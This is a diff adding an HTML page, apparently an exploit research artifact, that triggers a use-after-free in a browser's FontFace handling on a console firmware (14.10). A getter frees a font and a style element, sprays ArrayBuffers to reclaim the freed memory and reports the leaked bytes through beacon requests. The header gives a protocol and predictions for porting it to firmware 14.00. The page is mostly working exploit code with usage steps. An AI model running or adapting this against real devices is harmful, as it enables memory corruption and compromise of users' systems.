@@ -1,0 +1,107 @@
+<!--
+ cobrajet302gt farm landing vehicle - VERBATIM publication 2026-11-02 (operator-approved).
+ CODE IS BYTE-IDENTICAL to our 14.10 bench artifact (campaign42 page, posted record on ZZ#168).
+ Only the <title> and this header were added - the old title said "p563", which collides with the
+ Canvas probes (ZZ#180), so we renamed rather than propagate the collision.
+
+ WHAT IS PROVEN ON OUR BENCH [X, records already posted on ZZ#168]:
+  - fresh cold boot, first loads: same-class reclaim HITs ~100% (farm-oracle re-pin).
+    campaign42: THIS page, 3/3 HIT-b36-s192 fresh-process loads, first cold-boot session;
+    load-1 m_clients byte-constant 16/16 across boots.
+  - V-grammar (post-churn timing) 0/37 vs THIS grammar 3/3 on the same console same evening:
+    form-specificity law, natural A/B. The board was not dead; the vehicle was.
+ UNTESTED: 14.00. Grade: [X] proven 14.10; on 14.00 everything below is [I].
+
+ PROTOCOL - the file is meaningless without it (all laws posted on ZZ#168, Nov 1-2):
+  1. ONE trigger per page load, reload between trials. Same-load retries are ONE draw
+     (series-grade law; a second trial in the same load crashes our process deterministically).
+  2. Cold-boot discipline: grade the first ~4 loads only; after ~40 loads of churn the
+     window flips to zero-landing (cold-boot law).
+  3. Attribution beacon REQUIRED: the then-trap is page-global (loaded promise resolves WITH
+     the face, FontFace.cpp:344); a beacon that does not name the face dates nothing.
+  4. No fonts.clear() in the free path: this vehicle uses styleEl.remove() + single-face
+     economy (the both-bench clear()-correlation row from this thread).
+  5. Constants are per-(console, page-form, FW) triples: b36/s192 and our respawn strides are
+     OURS. Re-pin to yours first (a size-class sweep on your box is cheap and may be required).
+  6. /beacon/ URLs are ours and relative - swap in your own beacon host; the try/catch makes
+     a missing beacon silent, it does NOT make the run instrumented.
+
+ PREDICTIONS (pre-registered, falsifiable, per-load grading only):
+  P1: >=5/10 per-load trials HIT, cold-boot windows, own re-pinned constants, attributed
+      beacons  =>  the free/reclaim producer lives on 14.00 too; the wall was protocol.
+  P2: 10/10 clean misses with attributed trigger + free-oracle delta  =>  era fence: the
+      producer/walk regime differs between 14.00 and 14.10 forks. Publish it; it is the
+      strongest structural negative available this week, and it grades clean.
+  P3: any HIT without face-attribution, or outside the cold-boot window  =>  uncounted.
+     Do not blend regimes into one rate.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>farm landing vehicle (14.10) - verbatim publication</title>
+<script>
+/* SYNC arm per @vincenzoiacovone: free+spray+check FULLY synchronous inside the
+   getter; only the reads are deferred (60/400 ms). Model: same-process reload
+   ~0, new-process load ~coin. On our bench this arm SEGVed ~100% before —
+   SEGV = WebProcess kill = trial loop reset (crash -> re-entry = fresh coin). */
+window.onerror=function(m,u,l){try{var e=new XMLHttpRequest();e.open('GET','/beacon/PS-ERR?d='+encodeURIComponent(m+'@'+l)+'&t='+Date.now(),false);e.send();}catch(_){}return true;};
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var SIZES = [64, 96, 128, 160, 192, 224, 256, 320, 384, 512, 768, 1024, 2048];
+var K = 8, styleEl = null, fired = false, done = false;
+function hex(v){ return ('0' + v.toString(16)).slice(-2); }
+function setup(){
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('PS-SETUP');
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;                       // sync layout flush
+      window.__map = [];
+      for (var si = 0; si < SIZES.length; si++) {
+        var size = SIZES[si];
+        for (var k = 0; k < K; k++) {
+          var ab = new ArrayBuffer(size);
+          window.__map.push({ size: size, view: new Uint8Array(ab) });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      b('PS-GETTER-DONE');
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('PS-LOAD-CALLED');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('PS-RESOLVED'); }, function(){ b('PS-REJECTED'); });
+  setTimeout(scan, 60);
+  setTimeout(scan, 400);
+  setTimeout(function(){ if (!done) b('PS-NOSCAN-fired-' + (fired ? 1 : 0)); }, 1500);
+}
+function scan(){
+  if (done) return;
+  var m = window.__map; if (!m || !m.length) return;
+  done = true;
+  var out = [];
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0, first = -1;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) { n++; if (first < 0) first = j; }
+    if (n) {
+      var s = '';
+      var stop = Math.min(v.length, first + 256); for (var j = first; j < stop; j++) s += hex(v[j]);
+      out.push('b' + i + '-s' + m[i].size + '-o' + first + '-n' + n + '-' + s);
+    }
+  }
+  if (!out.length) { b('PS-ALL-CLEAN-' + m.length); return; }
+  b('PS-HIT-' + out.join('_'));
+}
+function run(){ setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+b('PS-PARSED');
+</script></head><body><pre id="o">PS-SYNC-ARM</pre></body></html>
